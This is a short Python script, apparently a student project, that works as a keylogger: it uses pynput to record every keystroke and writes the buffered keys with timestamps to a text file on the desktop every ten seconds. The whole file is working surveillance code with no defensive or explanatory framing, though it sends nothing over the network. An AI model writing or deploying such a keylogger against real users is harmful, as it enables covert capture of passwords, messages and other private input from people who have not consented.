from pynput.keyboard import Key, Listener
import logging
import threading

path = r"C:\Users\Student\Desktop\log.txt"
buffer = ""
time_interval = 10

logging.basicConfig(filename = path, level = logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
	global buffer
	try:
		buffer += key.char
	except:
		buffer += str(key)

def write_log():
	global buffer
	threading.Timer(time_interval, write_log).start()
	if buffer:
		logging.info("".join(buffer))
		buffer = ""

write_log()

with Listener(on_press = on_press) as listener:
    listener.join()
